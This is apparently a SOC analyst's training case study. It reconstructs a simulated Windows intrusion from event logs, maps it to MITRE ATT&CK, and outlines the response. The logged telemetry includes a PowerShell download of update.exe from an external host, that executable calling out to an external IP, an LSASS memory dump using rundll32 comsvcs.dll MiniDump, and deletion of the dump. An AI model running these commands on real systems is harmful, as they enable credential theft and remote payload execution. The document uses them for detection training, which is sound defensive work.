
# SOC Investigation Case Study — The Administrator and the Intruder

## Mixed-Telemetry Investigation: Distinguishing Legitimate Administration from Active Compromise

## Overview

This investigation was designed to simulate a realistic SOC scenario where legitimate administrative activity transitions into malicious behavior.

The challenge was not simply to identify suspicious commands. The objective was to determine:

* Where legitimate administration ended
* When suspicious behavior became evidence of compromise
* How to reconstruct the attack chain
* Which systems became affected
* How multiple Windows telemetry sources could be correlated
* How a SOC analyst should prioritize investigation and escalation

The investigation involved activity across:

```text
CLIENT12
    ↓
CLIENT15
    ↓
DC01
    ↓
FILESERVER01
```

The primary telemetry sources included:

* Windows Security Events
* Windows PowerShell Script Block Logging
* Sysmon
* Process creation events
* Authentication events
* Kerberos service-ticket events
* File access events
* Network connection telemetry

---

# 1. Investigation Telemetry

Before analyzing the incident, the following telemetry was provided.

This is the complete event sequence used for the investigation.

```text
08:02:11  CLIENT12
4624
Account: HelpDesk01
Logon Type: 2


08:02:19  CLIENT12
4688
powershell.exe
Parent: explorer.exe
Command:
Get-Service


08:02:31  CLIENT12
4104
Get-Process


08:03:04  CLIENT12
4104
Get-ADComputer -Filter *


08:03:16  DC01
4769
Account: HelpDesk01
Service:
ldap/DC01


08:03:24  CLIENT12
4688
powershell.exe
Command:
Enter-PSSession -ComputerName CLIENT15


08:03:31  CLIENT15
4624
Account: HelpDesk01
Logon Type: 3
Source: CLIENT12


08:03:35  CLIENT15
4688
wsmprovhost.exe
Parent: svchost.exe


08:03:42  CLIENT15
4104
Get-Service


08:04:02  CLIENT15
4104
Get-Process


08:04:17  CLIENT15
4688
powershell.exe
Command:
Get-ChildItem C:\Users


08:04:38  CLIENT15
4104
Get-LocalUser


08:05:01  CLIENT15
4688
powershell.exe
Command:
Get-ADGroupMember "Domain Admins"


08:05:17  CLIENT15
Sysmon 3
powershell.exe
→ 185.220.101.44
Port: 443


08:05:23  CLIENT15
4104
Invoke-WebRequest
https://cdn-storage.xyz/update.exe


08:05:29  CLIENT15
Sysmon 11
File Created
C:\ProgramData\update.exe


08:05:41  CLIENT15
4688
update.exe
Parent: powershell.exe


08:05:48  CLIENT15
Sysmon 3
update.exe
→ 185.220.101.44
Port: 443


08:06:12  CLIENT15
4688
rundll32.exe
Command:
comsvcs.dll, MiniDump 612 C:\ProgramData\lsass.dmp full


08:06:18  CLIENT15
Sysmon 11
File Created
C:\ProgramData\lsass.dmp


08:06:29  CLIENT15
4688
powershell.exe
Command:
Remove-Item C:\ProgramData\lsass.dmp


08:06:35  CLIENT15
4104
Remove-Item C:\ProgramData\lsass.dmp


08:07:02  DC01
4769
Account: HelpDesk01
Service:
cifs/FILESERVER01


08:07:15  FILESERVER01
4624
Account: HelpDesk01
Logon Type: 3
Source: CLIENT15


08:07:29  FILESERVER01
4663
Object:
\\FILESERVER01\Finance\Payroll2026.xlsx

Access:
ReadData
```

---

# 2. Investigation Objective

The central question was:

> **At what point does apparently legitimate administration become an active compromise?**

The presence of a helpdesk account makes the investigation particularly interesting.

A helpdesk administrator may legitimately:

* Log onto workstations
* Use PowerShell
* Query Active Directory
* Enumerate services and processes
* Establish PowerShell Remoting sessions
* Troubleshoot another endpoint

Therefore, individual events cannot automatically be classified as malicious.

The investigation must consider the **sequence, context, account, destination, process behavior, network activity and subsequent actions**.

---

# 3. Initial Assessment

The activity initially appears consistent with legitimate helpdesk administration.

The sequence begins with:

```text
HelpDesk01
    ↓
CLIENT12
    ↓
PowerShell
    ↓
Get-Service
    ↓
Get-Process
    ↓
Active Directory discovery
    ↓
PowerShell Remoting
    ↓
CLIENT15
```

At this stage, there is not enough evidence to declare an incident.

A helpdesk technician troubleshooting CLIENT15 could reasonably perform some of these actions.

---

# 4. Where Does Legitimate Activity End?

The last event I would initially consider potentially legitimate is:

```text
08:04:02
CLIENT15
4104
Get-Process
```

Both:

```text
Get-Service
Get-Process
```

are common administrative and troubleshooting commands.

Even:

```text
Get-ChildItem C:\Users
Get-LocalUser
```

can have legitimate administrative purposes depending on the troubleshooting task.

However, the investigation becomes increasingly suspicious as the activity progresses.

---

# 5. First Strong Point of Suspicion

The first strong indicator of suspicious activity is:

```text
08:05:01
CLIENT15
4688

powershell.exe

Get-ADGroupMember "Domain Admins"
```

This command is not inherently malicious.

However, its **context** is concerning.

The account is:

```text
HelpDesk01
```

The account has:

1. Logged onto CLIENT12
2. Performed host and process discovery
3. Queried Active Directory
4. Established a remote PowerShell session to CLIENT15
5. Performed additional local enumeration
6. Queried membership of the highly privileged Domain Admins group

The combination creates a strong behavioral signal.

### Classification at this point:

**Suspicious**

I would increase monitoring and continue investigation rather than immediately declaring an incident.

The evidence has not yet demonstrated malicious execution or confirmed compromise.

---

# 6. Why the Context Matters

A SOC analyst should avoid making decisions based on a single command.

For example:

```powershell
Get-ADGroupMember "Domain Admins"
```

could be legitimate if a helpdesk technician is:

* Troubleshooting permissions
* Investigating an access issue
* Supporting an identity-related ticket
* Performing authorized administration

However, the same command becomes much more concerning when followed by:

```text
External network connection
        ↓
PowerShell download
        ↓
Executable creation
        ↓
Executable execution
        ↓
LSASS memory dumping
        ↓
File deletion
        ↓
Sensitive file access
```

This is where behavioral correlation becomes critical.

---

# 7. Escalation of Suspicion

At:

```text
08:05:17

CLIENT15

Sysmon Event 3

powershell.exe
→ 185.220.101.44
Port 443
```

the investigation becomes significantly more concerning.

An unexpected outbound HTTPS connection from PowerShell following privileged Active Directory enumeration warrants investigation.

However, I would not rely on the IP address alone to declare malicious activity.

The next events provide much stronger evidence.

---

# 8. PowerShell Download Activity

At:

```text
08:05:23

CLIENT15
4104

Invoke-WebRequest
https://cdn-storage.xyz/update.exe
```

PowerShell is explicitly being used to retrieve an executable from an external location.

This is a major escalation.

The activity is immediately followed by:

```text
08:05:29

Sysmon Event 11

File Created

C:\ProgramData\update.exe
```

and then:

```text
08:05:41

4688

update.exe
Parent:
powershell.exe
```

This creates a highly suspicious execution chain:

```text
PowerShell
    ↓
Invoke-WebRequest
    ↓
External executable download
    ↓
update.exe created
    ↓
update.exe executed
```

At this point, I would escalate the investigation substantially.

---

# 9. Process and Network Correlation

The downloaded executable subsequently communicates with the same external destination:

```text
08:05:48

Sysmon Event 3

update.exe
→ 185.220.101.44
Port 443
```

This provides stronger evidence that the downloaded executable is actively communicating externally.

The sequence can now be represented as:

```text
CLIENT15
    │
    ├── powershell.exe
    │       │
    │       ├── Invoke-WebRequest
    │       │
    │       └── Downloads update.exe
    │
    └── update.exe
            │
            └── HTTPS → 185.220.101.44
```

This is no longer simply an administrative investigation.

The behavior is consistent with malicious execution and possible command-and-control or external staging activity.

---

# 10. Confirmed Credential Access

The strongest evidence of compromise appears at:

```text
08:06:12

CLIENT15
4688

rundll32.exe

comsvcs.dll, MiniDump 612
C:\ProgramData\lsass.dmp full
```

The command is attempting to dump LSASS memory.

LSASS contains authentication-related material, making LSASS memory dumping a high-value credential-access technique.

The activity is followed by:

```text
08:06:18

Sysmon Event 11

File Created

C:\ProgramData\lsass.dmp
```

This confirms that the memory dump file was created.

At this point, the classification should be:

# INCIDENT

The investigation now contains multiple independent indicators of compromise:

* Suspicious Active Directory enumeration
* External PowerShell communication
* Download of an executable
* Execution of the downloaded executable
* External communication from the executable
* LSASS memory dumping
* Evidence removal

This is sufficient to treat the activity as an active security incident.

---

# 11. Evidence Removal

The attacker subsequently executes:

```text
08:06:29

4688

powershell.exe

Remove-Item C:\ProgramData\lsass.dmp
```

PowerShell logging confirms:

```text
08:06:35

4104

Remove-Item C:\ProgramData\lsass.dmp
```

This indicates an attempt to remove evidence of credential-access activity.

The deletion itself does not erase the fact that the activity occurred because the organization may still have:

* Windows event logs
* Sysmon telemetry
* SIEM copies
* EDR telemetry
* File-system artifacts
* Network logs
* Authentication records

This reinforces the importance of centralized logging.

---

# 12. Access to FILESERVER01

The attacker then requests a Kerberos service ticket:

```text
08:07:02

DC01
4769

Account:
HelpDesk01

Service:
cifs/FILESERVER01
```

This is followed by:

```text
08:07:15

FILESERVER01
4624

Account:
HelpDesk01

Logon Type:
3

Source:
CLIENT15
```

The source has now changed:

```text
CLIENT12
    ↓
CLIENT15
    ↓
FILESERVER01
```

The account is being used to authenticate to another system after the compromise of CLIENT15.

---

# 13. Sensitive File Access

The final event shows:

```text
08:07:29

FILESERVER01
4663

Object:
\\FILESERVER01\Finance\Payroll2026.xlsx

Access:
ReadData
```

The investigation therefore ends with access to a potentially sensitive financial/payroll document.

This expands the potential impact beyond endpoint compromise.

---

# 14. Reconstructed Attack Chain

The complete investigation can now be reconstructed as:

```text
HelpDesk01
     │
     ▼
CLIENT12
     │
     ├── Interactive logon
     ├── PowerShell
     ├── Get-Service
     ├── Get-Process
     └── AD discovery
             │
             ▼
     Enter-PSSession CLIENT15
             │
             ▼
        CLIENT15
             │
             ├── Local discovery
             ├── Domain Admin enumeration
             │
             ├── PowerShell
             │      ↓
             │  Invoke-WebRequest
             │      ↓
             │  update.exe
             │
             ├── update.exe execution
             │      ↓
             │  External HTTPS communication
             │
             ├── LSASS memory dump
             │      ↓
             │  lsass.dmp
             │
             ├── Delete lsass.dmp
             │
             ▼
        FILESERVER01
             │
             └── Payroll2026.xlsx
                 ReadData
```

---

# 15. MITRE ATT&CK Mapping

The observed activity maps to several MITRE ATT&CK techniques.

| Activity                            | ATT&CK Technique                | Description                                |
| ----------------------------------- | ------------------------------- | ------------------------------------------ |
| `Get-ADComputer -Filter *`          | T1018 / T1069-related discovery | System and account/domain discovery        |
| `Get-ADGroupMember "Domain Admins"` | T1069.002                       | Permission Groups Discovery: Domain Groups |
| `Enter-PSSession`                   | T1021.006                       | Windows Remote Management                  |
| `Invoke-WebRequest`                 | T1105                           | Ingress Tool Transfer                      |
| `update.exe` execution              | T1204 / execution behavior      | Execution of transferred payload           |
| External HTTPS communication        | T1071.001                       | Web Protocols                              |
| LSASS memory dump                   | T1003.001                       | OS Credential Dumping: LSASS Memory        |
| `Remove-Item lsass.dmp`             | T1070                           | Indicator Removal                          |
| Access to payroll file              | Collection                      | Collection of sensitive information        |

The exact ATT&CK mapping should be validated against the organization's detection framework and the precise behavior observed.

---

# 16. First Splunk Investigation

My initial investigation would establish the broader activity surrounding CLIENT12 before narrowing into individual events.

For example:

```spl
index=wineventlog host=CLIENT12 earliest=-2h latest=+2h
| table _time EventCode Account_Name Logon_ID LogonGuid ProcessGuid ParentImage Image Process_Command_Line
| sort _time
```

The objective is to determine:

* What happened before the first visible event?
* Was CLIENT12 already compromised?
* Was HelpDesk01 legitimately using the workstation?
* Were there earlier suspicious processes?
* Did another account interact with the machine?

---

# 17. Investigation Pivots

I would perform the pivots in approximately this order.

### Pivot 1 — Account

Start with:

```text
HelpDesk01
```

Determine:

* Where else did the account authenticate?
* Was it active on other endpoints?
* Were there unusual logon locations?
* Did the account suddenly become active outside normal patterns?

---

### Pivot 2 — LogonGUID

Use the relevant authentication context to follow activity associated with the session.

This helps connect authentication events with subsequent activity associated with the same logon context.

---

### Pivot 3 — ProcessGUID

Use ProcessGUID where available to reconstruct process lineage.

For example:

```text
powershell.exe
      ↓
update.exe
      ↓
network connection
```

This helps establish whether processes belong to the same execution chain.

---

### Pivot 4 — Source and Destination Hosts

Track:

```text
CLIENT12 → CLIENT15 → FILESERVER01
```

This is critical because the investigation crosses multiple systems.

---

# 18. Additional Telemetry Required

I would collect additional telemetry from:

### CLIENT12

To determine whether initial compromise occurred before the visible timeline.

Look for:

* Process creation
* PowerShell activity
* Authentication events
* Persistence mechanisms
* Network connections
* File creation

### CLIENT15

This is the primary compromised endpoint.

I would collect:

* Sysmon Event ID 1
* Sysmon Event ID 3
* Sysmon Event ID 11
* PowerShell 4104
* Security 4688
* Authentication events
* Persistence mechanisms
* EDR alerts
* DNS activity

### DC01

I would investigate:

* 4768
* 4769
* 4624
* 4625
* Directory-service activity
* Authentication anomalies

The objective is to determine whether the compromised credentials were used elsewhere.

### FILESERVER01

I would investigate:

* 4624
* 4663
* Additional file access events
* SMB activity
* Other files accessed by HelpDesk01
* Subsequent file modifications or transfers

---

# 19. Scope Assessment

### CLIENT12

**In scope for investigation.**

CLIENT12 is the initial workstation in the visible sequence and may have been the source of the remote session.

However, the provided telemetry does **not independently prove that CLIENT12 was infected**.

Further investigation is required.

### CLIENT15

**Confirmed affected.**

Evidence includes:

* Suspicious PowerShell activity
* External executable download
* Executable execution
* External network communication
* LSASS memory dumping
* Evidence removal

CLIENT15 should be treated as the primary compromised endpoint.

### FILESERVER01

**Affected / potentially impacted.**

The compromised activity resulted in:

* Authentication to FILESERVER01
* Access to a payroll document

The scope of additional file access must be investigated.

### DC01

**Involved in authentication.**

The provided telemetry shows DC01 issuing Kerberos service tickets.

This does not by itself demonstrate compromise of DC01, but authentication activity involving the compromised account should be investigated.

---

# 20. Incident Severity

Based on the available evidence, I would treat this as a **high-severity security incident**.

The combination of:

```text
Active Directory reconnaissance
        +
Remote PowerShell
        +
External payload download
        +
Payload execution
        +
External communication
        +
LSASS credential dumping
        +
Evidence removal
        +
Sensitive file access
```

indicates a progression from reconnaissance to execution, credential access, defense evasion and collection.

The potential exposure of payroll information further increases the business impact.

---

# 21. Immediate SOC Response

The first priority would be containment.

### 1. Isolate CLIENT15

CLIENT15 is the confirmed compromised endpoint.

### 2. Investigate and potentially isolate CLIENT12

CLIENT12 should be investigated for initial access or credential compromise before assuming it is clean.

### 3. Disable or restrict HelpDesk01

The account should be investigated and, where appropriate, disabled or have its active sessions and credentials revoked.

### 4. Protect FILESERVER01

Review and restrict the compromised account's access while determining the extent of file access.

### 5. Preserve evidence

Do not rely solely on deleting or cleaning the endpoint.

Preserve:

* SIEM telemetry
* EDR telemetry
* Memory where appropriate
* Disk artifacts
* Network logs
* Authentication logs

### 6. Investigate credential exposure

Because LSASS was dumped, credentials associated with the affected system should be considered potentially compromised.

---

# 22. Key SOC Lessons

This investigation demonstrates why SOC analysts should avoid relying on isolated alerts.

At the beginning of the timeline:

```text
PowerShell
Get-Service
Get-Process
Enter-PSSession
```

could all have legitimate administrative explanations.

The investigation changed when the behavior became chained:

```text
AD reconnaissance
       ↓
Domain Admin enumeration
       ↓
External PowerShell communication
       ↓
Executable download
       ↓
Payload execution
       ↓
LSASS dumping
       ↓
Evidence removal
       ↓
Sensitive file access
```

The **sequence** provided much stronger evidence than any single event.

---

# 23. Key Takeaways

This exercise reinforced several SOC investigation principles:

### Context matters

A helpdesk account performing PowerShell activity is not automatically malicious.

### Sequence matters

Multiple individually explainable events can become highly suspicious when chained together.

### Correlation matters

Account, host, process, authentication and network telemetry should be investigated together.

### Process lineage matters

ProcessGUID and parent-child relationships can help reconstruct execution.

### Credential dumping changes the incident

An LSASS memory dump is a major escalation point because credentials may be exposed.

### Evidence removal does not erase telemetry

Centralized SIEM logging can preserve evidence even when an attacker deletes local files.

### Scope must be evidence-based

A machine can be in scope for investigation without being definitively classified as compromised.

---

# Conclusion

This mixed-telemetry investigation simulated a realistic SOC scenario in which legitimate administrative behavior gradually transitioned into an active compromise.

The most important lesson was not simply recognizing malicious commands. It was learning to determine **when the behavioral context changed**.

The investigation progressed from:

```text
Potentially legitimate administration
              ↓
Suspicious reconnaissance
              ↓
Malware staging
              ↓
Malicious execution
              ↓
Credential access
              ↓
Defense evasion
              ↓
Sensitive data access
```

By correlating Windows authentication, PowerShell, Sysmon, process creation, network and file-access telemetry, the investigation could be reconstructed as a coherent attack chain rather than a collection of isolated alerts.

This exercise represents the type of analytical workflow I am continuing to develop as I progress toward SOC analyst responsibilities.

---

## Skills Practiced

* Splunk SIEM investigation
* Windows event analysis
* PowerShell telemetry analysis
* Sysmon analysis
* Process-tree reconstruction
* Authentication analysis
* Kerberos telemetry analysis
* Threat hunting
* Attack-chain reconstruction
* Incident classification
* Scope assessment
* MITRE ATT&CK mapping
* SOC escalation and containment reasoning

---

**Author:** Precious Anyanwu
**Focus:** SOC Analysis | Incident Response | Splunk | Cloud Security
